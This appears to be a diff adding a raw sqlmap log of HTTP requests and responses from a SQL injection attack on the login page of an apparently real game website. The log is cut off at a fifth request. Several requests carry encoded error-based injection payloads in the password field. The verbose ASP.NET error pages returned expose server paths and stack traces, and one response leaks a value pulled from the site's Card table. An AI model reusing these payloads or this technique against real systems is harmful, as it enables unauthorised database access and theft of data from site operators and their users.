@@ -1,0 +1,2510 @@
+HTTP request [#1]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 40
+Connection: close
+
+act=login&uid=111111&pass=123456&s=false
+
+HTTP response [#1] (200 OK):
+Content-length: 27
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:40 GMT
+Content-type: text/html; charset=utf-8
+
+游戏账号或密码错误
+
+############################################################################
+
+HTTP request [#2]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 405
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%209691%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28CONCAT%28NULL%2CNULL%29%3DCONCAT%28NULL%2CNULL%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20mdDI&s=false
+
+HTTP response [#2] (500 Internal Server Error):
+Content-length: 8766
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:41 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>'CONCAT' 不是可以识别的 内置函数名称。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>'CONCAT' 不是可以识别的 内置函数名称。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 'CONCAT' 不是可以识别的 内置函数名称。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 'CONCAT' 不是可以识别的 内置函数名称。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.ConsumeMetaData() +59
+   System.Data.SqlClient.SqlDataReader.get_MetaData() +118
+   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +6368321
+   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async) +6369890
+   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result) +538
+   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +28
+   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +256
+   System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) +19
+   System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) +21
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +325
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 'CONCAT' 不是可以识别的 内置函数名称。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
+   在 System.Data.SqlClient.SqlDataReader.get_MetaData()
+   在 System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
+   在 System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
+   在 System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
+   在 System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
+   在 System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
+   在 System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
+   在 System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#3]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 384
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%204307%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28ISJSON%28NULL%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20Cgtq&s=false
+
+HTTP response [#3] (500 Internal Server Error):
+Content-length: 8766
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:41 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>'ISJSON' 不是可以识别的 内置函数名称。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>'ISJSON' 不是可以识别的 内置函数名称。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 'ISJSON' 不是可以识别的 内置函数名称。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 'ISJSON' 不是可以识别的 内置函数名称。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.ConsumeMetaData() +59
+   System.Data.SqlClient.SqlDataReader.get_MetaData() +118
+   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString) +6368321
+   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async) +6369890
+   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result) +538
+   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +28
+   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +256
+   System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior) +19
+   System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) +21
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +325
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 'ISJSON' 不是可以识别的 内置函数名称。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.ConsumeMetaData()
+   在 System.Data.SqlClient.SqlDataReader.get_MetaData()
+   在 System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)
+   在 System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)
+   在 System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)
+   在 System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
+   在 System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
+   在 System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)
+   在 System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#4]:
+POST /Login.aspx HTTP/1.1
+Host: www.moli1.com
+Accept-encoding: gzip,deflate
+x-forwarded-for: 8.8.8.33
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Content-length: 500
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%201661%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28MAX%28ISNULL%28CAST%28time1%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb.dbo.Card%20WHERE%20CONVERT%28NVARCHAR%284000%29%2Cnum%29%20LIKE%20CHAR%2849%29%2BCHAR%2851%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20YHZf&s=false
+
+HTTP response [#4] (500 Internal Server Error):
+Content-length: 8137
+X-powered-by: CG
+X-aspnet-version: 4.0.30319
+Uri: http://www.moli1.com:80/Login.aspx
+Server: Microsoft-IIS/7.5
+Connection: close
+Cache-control: private,max-age=999990
+Date: Thu, 04 Aug 2016 10:45:41 GMT
+Content-type: text/html; charset=utf-8
+
+<html>
+    <head>
+        <title>在将 nvarchar 值 'qkxvq08 \xa03 2016 \xa01:52PMqxqjq' 转换成数据类型 int 时失败。</title>
+        <style>
+         body {font-family:"Verdana";font-weight:normal;font-size: .7em;color:black;} 
+         p {font-family:"Verdana";font-weight:normal;color:black;margin-top: -5px}
+         b {font-family:"Verdana";font-weight:bold;color:black;margin-top: -5px}
+         H1 { font-family:"Verdana";font-weight:normal;font-size:18pt;color:red }
+         H2 { font-family:"Verdana";font-weight:normal;font-size:14pt;color:maroon }
+         pre {font-family:"Lucida Console";font-size: .9em}
+         .marker {font-weight: bold; color: black;text-decoration: none;}
+         .version {color: gray;}
+         .error {margin-bottom: 10px;}
+         .expandable { text-decoration:underline; font-weight:bold; color:navy; cursor:hand; }
+        </style>
+    </head>
+
+    <body bgcolor="white">
+
+            <span><H1>“/”应用程序中的服务器错误。<hr width=100% size=1 color=silver></H1>
+
+            <h2> <i>在将 nvarchar 值 'qkxvq08 \xa03 2016 \xa01:52PMqxqjq' 转换成数据类型 int 时失败。</i> </h2></span>
+
+            <font face="Arial, Helvetica, Geneva, SunSans-Regular, sans-serif ">
+
+            <b> 说明: </b>执行当前 Web 请求期间，出现未经处理的异常。请检查堆栈跟踪信息，以了解有关该错误以及代码中导致错误的出处的详细信息。
+
+            <br><br>
+
+            <b> 异常详细信息: </b>System.Data.SqlClient.SqlException: 在将 nvarchar 值 'qkxvq08 \xa03 2016 \xa01:52PMqxqjq' 转换成数据类型 int 时失败。<br><br>
+
+            <b>源错误:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+行 22:         Dim sc As New SqlCommand(sql, Conn)
+行 23:         Dim da As New SqlDataAdapter(sc)
+<font color=red>行 24:         da.Fill(ds)
+</font>行 25:         Return ds.Tables(0)
+行 26:     End Function</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <b> 源文件: </b> D:\MLWeb\App_Code\SQL.vb<b> \xa0\xa0 行: </b> 24
+            <br><br>
+
+            <b>堆栈跟踪:</b> <br><br>
+
+            <table width=100% bgcolor="#ffffcc">
+               <tr>
+                  <td>
+                      <code><pre>
+
+[SqlException (0x80131904): 在将 nvarchar 值 'qkxvq08  3 2016  1:52PMqxqjq' 转换成数据类型 int 时失败。]
+   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection) +404
+   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning() +412
+   System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj) +1363
+   System.Data.SqlClient.SqlDataReader.HasMoreRows() +301
+   System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout) +422
+   System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping) +167
+   System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue) +292
+   System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords) +529
+   System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +422
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +420
+   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +306
+   SQL.SelectSQl(String sql) in D:\MLWeb\App_Code\SQL.vb:24
+   web_Login.GetList(String strWhere) in d:\MLWeb\Login.aspx.cs:201
+   web_Login.Login(String uid, String pass) in d:\MLWeb\Login.aspx.cs:157
+   web_Login.Page_Load(Object sender, EventArgs e) in d:\MLWeb\Login.aspx.cs:39
+   System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) +25
+   System.Web.UI.Control.LoadRecursive() +71
+   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +3064
+</pre></code>
+
+                  </td>
+               </tr>
+            </table>
+
+            <br>
+
+            <hr width=100% size=1 color=silver>
+
+            <b>版本信息:</b>\xa0Microsoft .NET Framework 版本:4.0.30319; ASP.NET 版本:4.0.30319.272
+
+            </font>
+
+    </body>
+</html>
+<!-- 
+[SqlException]: 在将 nvarchar 值 'qkxvq08  3 2016  1:52PMqxqjq' 转换成数据类型 int 时失败。
+   在 System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)
+   在 System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()
+   在 System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)
+   在 System.Data.SqlClient.SqlDataReader.HasMoreRows()
+   在 System.Data.SqlClient.SqlDataReader.ReadInternal(Boolean setTimeout)
+   在 System.Data.Common.DataAdapter.FillLoadDataRow(SchemaMapping mapping)
+   在 System.Data.Common.DataAdapter.FillFromReader(DataSet dataset, DataTable datatable, String srcTable, DataReaderContainer dataReader, Int32 startRecord, Int32 maxRecords, DataColumn parentChapterColumn, Object parentChapterValue)
+   在 System.Data.Common.DataAdapter.Fill(DataSet dataSet, String srcTable, IDataReader dataReader, Int32 startRecord, Int32 maxRecords)
+   在 System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior)
+   在 System.Data.Common.DbDataAdapter.Fill(DataSet dataSet)
+   在 SQL.SelectSQl(String sql) 位置 D:\MLWeb\App_Code\SQL.vb:行号 24
+   在 web_Login.GetList(String strWhere) 位置 d:\MLWeb\Login.aspx.cs:行号 201
+   在 web_Login.Login(String uid, String pass) 位置 d:\MLWeb\Login.aspx.cs:行号 157
+   在 web_Login.Page_Load(Object sender, EventArgs e) 位置 d:\MLWeb\Login.aspx.cs:行号 39
+   在 System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e)
+   在 System.Web.UI.Control.LoadRecursive()
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+[HttpUnhandledException]: 引发类型为“System.Web.HttpUnhandledException”的异常。
+   在 System.Web.UI.Page.HandleError(Exception e)
+   在 System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+   在 System.Web.UI.Page.ProcessRequest()
+   在 System.Web.UI.Page.ProcessRequest(HttpContext context)
+   在 ASP.login_aspx.ProcessRequest(HttpContext context) 位置 c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\root\06f31654\b4da8005\App_Web_sadlj52d.10.cs:行号 0
+   在 System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+   在 System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
+--><!-- 
+此错误页可能包含敏感信息，因为 ASP.NET 通过 &lt;customErrors mode="Off"/> 被配置为显示详细错误消息。请考虑在生产环境中使用 <customErrors mode="On"/> 或 <customErrors mode="RemoteOnly"/>。-->
+
+############################################################################
+
+HTTP request [#5]:
+POST /Login.aspx HTTP/1.1
